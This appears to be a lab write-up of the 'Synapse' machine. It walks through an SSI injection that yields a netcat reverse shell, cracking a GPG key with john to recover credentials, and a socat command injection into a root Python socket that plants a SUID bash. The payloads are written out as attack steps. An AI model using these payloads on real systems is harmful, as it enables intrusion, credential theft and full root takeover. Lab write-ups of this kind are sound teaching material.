---
icon: ubuntu
---

# Synapse - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.209.149 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 15:51 EDT
Nmap scan report for 192.168.209.149
Host is up (0.031s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-title: SYNAPSE
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: SYNAPSE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: synapse
|   NetBIOS computer name: SYNAPSE\x00
|   Domain name: \x00
|   FQDN: synapse
|_  System time: 2025-10-08T15:52:06-04:00
| smb2-time: 
|   date: 2025-10-08T19:52:04
|_  start_date: N/A
|_clock-skew: mean: 1h20m03s, deviation: 2h18m35s, median: 2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   31.17 ms 192.168.45.1
2   30.30 ms 192.168.45.254
3   31.26 ms 192.168.251.1
4   31.48 ms 192.168.209.149

```

ftp doesn't accept anonymous login and smb won't show me anything without some creds. So I will go straight to port 80

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

The File manager is running elFinder, we cannot access it without admin creds

I am going to checkout the user tab

<figure><img src="../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

We got a username: `mindsflee`All of the options are under construction except for the edit profile picture

<figure><img src="../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

I tried uploading a reverse.php script but it will only accept images.

<figure><img src="../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

I discovered something weird ![](<../../.gitbook/assets/image (324).png>)

<figure><img src="../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

Server side includes? There are more details about this on [hacktricks](https://book.hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html) along with some payloads. I'll try one of them

### <mark style="color:$primary;">SSI Injection</mark>

Click send request and then click on follow redirection

<figure><img src="../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

click on follow redirection

<figure><img src="../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

on redirect we can see RCE, we should be able to get a shell

```
<!--#exec cmd="nc 192.168.45.158 80 -e /bin/bash" -->
```

<figure><img src="../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

As soon as you click folow redirection after, you will get a shell

<figure><img src="../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Inside mindsflee directory the `.gnupg` folder contains some creds. I'll download these to my machine and try to decrypt them.

### <mark style="color:$primary;">Cracking GPG Creds</mark>

<figure><img src="../../.gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>

Using `gpg`, we can attempt to import this key but it requires a passphrase. I'll crack it with john

```
gpg2john creds.priv > gpg_hash
```

```
john gpg_hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>

Using this, we can then import the key using `gpg` and decrypt the file. It will ask for a password:<mark style="color:$success;">**qwertyuiop**</mark>

```
gpg --import creds.priv
```

<figure><img src="../../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

The following action will aslo ask for the password:<mark style="color:$success;">**qwertyuiop**</mark>

```
gpg --output decrypted --decrypt creds.txt.gpg
```

<figure><img src="../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

we got mindsflee creds

```
mindsflee:m1ndsfl33w1llc4tchy0u?
```

<figure><img src="../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Sudo python script</mark>

<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>

mindsflee user can run sudo on the above python script

<figure><img src="../../.gitbook/assets/image (2587).png" alt=""><figcaption></figcaption></figure>

root has complete control over it, let's read it

```python
import socket
import os, os.path, sys
import time
from collections import deque    





print("""\
  
 _____ __ __ _____ _____ _____ _____ _____    _____ _____ _____ _____ _____ _____ ____  _____ _____ 
|   __|  |  |   | |  _  |  _  |   __|   __|  |     |     |     |     |  _  |   | |    \|   __| __  |
|__   |_   _| | | |     |   __|__   |   __|  |   --|  |  | | | | | | |     | | | |  |  |   __|    -|
|_____| |_| |_|___|__|__|__|  |_____|_____|  |_____|_____|_|_|_|_|_|_|__|__|_|___|____/|_____|__|__|


 
  """)

print("Focus your approach with a system designed for single network port access.")
print ("With Synapse Commander, a single arm delivers three multi-jointed instruments")
print("and a fully wristed 3DHD camera for visibility and control in narrow surgical spaces.")
print("Streamlined setup, multiple control modes and a dynamic statistics display are included")
print
print("1 - Access to ARM management")
print("2 - Enable 3DHD camera")
print("3 - Settings")
print("4 - Reboot the system")
print
instruction = raw_input("Synapse Instruction:")

if instruction == "1":
    
    print ("\nARM MANAGEMENT ENABLED")
    os.system("touch 2343432445467676")
elif instruction == "2":
    
    print ("\n3DHD CAMERA ENABLED")
    os.system("touch 5344225453244546")
elif instruction == "3":
    
    print ("\nACCESS TO SETTINGS CONFIGURATION")
    os.system("touch 77756563456244546")
elif instruction == "4":
    
    print ("\nSYSTEM REBOOTED")
    os.execl(sys.executable, sys.executable, *sys.argv)

else:
    os.execl(sys.executable, sys.executable, *sys.argv)



if os.path.exists("/tmp/synapse_commander.s"):
  os.remove("/tmp/synapse_commander.s")    

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/synapse_commander.s")
os.system("chmod o+w /tmp/synapse_commander.s")
while True:
  server.listen(1)
  conn, addr = server.accept()
  datagram = conn.recv(1024)
  if datagram:
    print(datagram)
    os.system(datagram)
    conn.close()
```

This program seems to open a Socket as `root` using the configuration of `synapse_commander.s` after we input any number from 1-3, since option 4 and all others would just re-run the script.

### <mark style="color:$primary;">Setup SSH</mark>

Before I begin I am going to generate a ssh key for mindsflee so we have ssh access

<figure><img src="../../.gitbook/assets/image (2588).png" alt=""><figcaption></figcaption></figure>

copy id\_rsa and use it to login via ssh

<figure><img src="../../.gitbook/assets/image (2589).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Socket Command Injection</mark>

In one SSH session, run the Python script and input '1'.&#x20;

```bash
sudo /usr/bin/python /home/mindsflee/synapse_commander.py
```

In another SSH session, run this command:

{% code overflow="wrap" %}
```bash
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/synapse_commander.s
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2591).png" alt=""><figcaption></figcaption></figure>

And we are root!
